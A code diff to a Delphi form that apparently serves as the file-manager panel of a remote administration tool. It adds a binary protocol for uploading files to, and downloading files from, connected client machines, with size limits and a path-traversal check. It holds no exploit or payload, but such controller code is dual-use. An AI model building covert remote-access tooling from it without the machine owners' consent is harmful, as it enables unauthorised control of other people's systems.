@@ -7,6 +7,10 @@ uses
   Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls, Vcl.ExtCtrls,
   Vcl.Menus, System.JSON, ncLines, System.UITypes, System.NetEncoding, System.IOUtils;
 
+const
+  PACKET_TYPE_FILE_UPLOAD   = $04;
+  PACKET_TYPE_FILE_DOWNLOAD = $05;
+
 type
   TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
   TUnregisterFormProc = procedure(aLine: TncLine) of object;
@@ -59,6 +63,7 @@ type
     procedure SetupForClient(aLine: TncLine; const aClientID: string;
       aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
     procedure HandleFileManagerJSON(JSONObj: TJSONObject);
+    procedure HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
     procedure DetachCallbacks;
     procedure RequestDrives;
     procedure RequestDirectory(const Path: string);
@@ -70,6 +75,15 @@ var
 implementation
 
 {$R *.dfm}
+
+type
+  TncLineAccess = class(TncLine);
+
+  TPacketHeader = packed record
+    Signature  : Word;
+    PacketType : Byte;
+    Size       : Cardinal;
+  end;
 
 procedure TForm9.SetupForClient(aLine: TncLine; const aClientID: string;
   aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
@@ -247,6 +261,8 @@ begin
   end
   else if SameText(Action, 'download') then
   begin
+    // Legacy Base64 download handler - keeping for compatibility if needed,
+    // but binary protocol is preferred now.
     var FileName := JSONObj.Values['name'].Value;
     var Base64Data := JSONObj.Values['data'].Value;
     var RawData: TBytes;
@@ -272,6 +288,54 @@ begin
     end;
 
     LogToStatus('Downloaded: ' + FileName);
+  end;
+end;
+
+procedure TForm9.HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
+begin
+  if PacketType = PACKET_TYPE_FILE_DOWNLOAD then
+  begin
+    if Length(Payload) < 4 then Exit;
+
+    var NameLen: Integer;
+    Move(Payload[0], NameLen, 4);
+
+    if (NameLen <= 0) or (NameLen > 2048) or (Length(Payload) < (4 + NameLen)) then Exit;
+
+    var FileName: string;
+    FileName := TEncoding.UTF8.GetString(Payload, 4, NameLen);
+
+    // Sanitization: Prevent path traversal
+    FileName := TPath.GetFileName(FileName);
+    if FileName = '' then Exit;
+
+    var FileDataLen := Length(Payload) - 4 - NameLen;
+    var SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
+    SavePath := TPath.Combine(SavePath, FClientID);
+    SavePath := TPath.Combine(SavePath, 'recovery_files');
+
+    if not TDirectory.Exists(SavePath) then
+      TDirectory.CreateDirectory(SavePath);
+
+    SavePath := TPath.Combine(SavePath, FileName);
+
+    TThread.CreateAnonymousThread(
+      procedure
+      begin
+        var MS := TMemoryStream.Create;
+        try
+          if FileDataLen > 0 then
+            MS.WriteBuffer(Payload[4 + NameLen], FileDataLen);
+          MS.SaveToFile(SavePath);
+          TThread.Queue(nil,
+            procedure
+            begin
+              LogToStatus('Downloaded (Binary): ' + FileName);
+            end);
+        finally
+          MS.Free;
+        end;
+      end).Start;
   end;
 end;
 
@@ -373,8 +437,35 @@ end;
 procedure TForm9.Download1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
+  SizeStr: string;
+  ValStr: string;
+  Val: Double;
+  FS: TFormatSettings;
 begin
   if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+
+  // Size check from ListView (Format: "1.23 MB")
+  if ListView1.Selected.SubItems.Count >= 3 then
+  begin
+    SizeStr := ListView1.Selected.SubItems[2];
+    if (Pos('GB', SizeStr) > 0) or (Pos('TB', SizeStr) > 0) then
+    begin
+      MessageBox(Handle, 'Dosya boyutu 50MB sınırını aşıyor. Maksimum 50MB olabilir.', 'İndirme Hatası', MB_OK or MB_ICONERROR);
+      Exit;
+    end;
+    if Pos('MB', SizeStr) > 0 then
+    begin
+      ValStr := Trim(Copy(SizeStr, 1, Pos('MB', SizeStr) - 1));
+      FS := TFormatSettings.Create;
+      FS.DecimalSeparator := '.';
+      if TryStrToFloat(ValStr, Val, FS) and (Val > 50.0) then
+      begin
+        MessageBox(Handle, 'Dosya boyutu 50MB sınırını aşıyor. Maksimum 50MB olabilir.', 'İndirme Hatası', MB_OK or MB_ICONERROR);
+        Exit;
+      end;
+    end;
+  end;
+
   JSONObj := TJSONObject.Create;
   try
     JSONObj.AddPair('action', 'downloadfile');
@@ -496,12 +587,15 @@ end;
 
 procedure TForm9.Upload1Click(Sender: TObject);
 var
-  JSONObj: TJSONObject;
   OpenDlg: TOpenDialog;
   FileBytes: TBytes;
-  Base64Str: string;
+  FileName: string;
+  DestPath: string;
+  Payload: TBytes;
+  NameBytes: TBytes;
+  NameLen: Integer;
 begin
-  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+  if not Assigned(FLine) then Exit;
 
   OpenDlg := TOpenDialog.Create(nil);
   try
@@ -509,24 +603,54 @@ begin
     begin
       if TFile.GetSize(OpenDlg.FileName) > (50 * 1024 * 1024) then
       begin
-        MessageBox(Handle, 'File size exceeds 50MB limit.', 'Upload Error', MB_OK or MB_ICONERROR);
+        MessageBox(Handle, 'Dosya boyutu 50MB sınırını aşıyor. Maksimum 50MB olabilir.', 'Yükleme Hatası', MB_OK or MB_ICONERROR);
         Exit;
       end;
 
-      FileBytes := TFile.ReadAllBytes(OpenDlg.FileName);
-      Base64Str := TNetEncoding.Base64.EncodeBytesToString(FileBytes);
-      Base64Str := Base64Str.Replace(#13, '').Replace(#10, '');
+      FileName := TPath.GetFileName(OpenDlg.FileName);
+      DestPath := IncludeTrailingPathDelimiter(FCurrentPath) + FileName;
 
-      JSONObj := TJSONObject.Create;
-      try
-        JSONObj.AddPair('action', 'uploadfile');
-        JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + TPath.GetFileName(OpenDlg.FileName));
-        JSONObj.AddPair('data', Base64Str);
-        FOnSendJSON(FLine, JSONObj);
-        StatusBar1.SimpleText := 'Uploading: ' + TPath.GetFileName(OpenDlg.FileName);
-      finally
-        JSONObj.Free;
-      end;
+      FileBytes := TFile.ReadAllBytes(OpenDlg.FileName);
+      NameBytes := TEncoding.UTF8.GetBytes(DestPath);
+      NameLen   := Length(NameBytes);
+
+      SetLength(Payload, 4 + NameLen + Length(FileBytes));
+      Move(NameLen, Payload[0], 4);
+      if NameLen > 0 then
+        Move(NameBytes[0], Payload[4], NameLen);
+      if Length(FileBytes) > 0 then
+        Move(FileBytes[0], Payload[4 + NameLen], Length(FileBytes));
+
+      TThread.CreateAnonymousThread(
+        procedure
+        var
+          Header: TPacketHeader;
+          SendBuf: TBytes;
+          DataLen: Integer;
+        begin
+          DataLen := Length(Payload);
+          Header.Signature := $524E; // 'NR'
+          Header.PacketType := PACKET_TYPE_FILE_UPLOAD;
+          Header.Size := Cardinal(DataLen);
+
+          SetLength(SendBuf, SizeOf(TPacketHeader) + DataLen);
+          Move(Header, SendBuf[0], SizeOf(TPacketHeader));
+          if DataLen > 0 then
+            Move(Payload[0], SendBuf[SizeOf(TPacketHeader)], DataLen);
+
+          try
+            TncLineAccess(FLine).SendBuffer(SendBuf[0], Length(SendBuf));
+            TThread.Queue(nil,
+              procedure
+              begin
+                if Assigned(StatusBar1) then
+                  StatusBar1.SimpleText := 'Yüklendi (Binary): ' + FileName;
+              end);
+          except
+            on E: Exception do
+              TThread.Queue(nil, procedure begin LogToStatus('Upload hatası: ' + E.Message); end);
+          end;
+        end).Start;
     end;
   finally
     OpenDlg.Free;
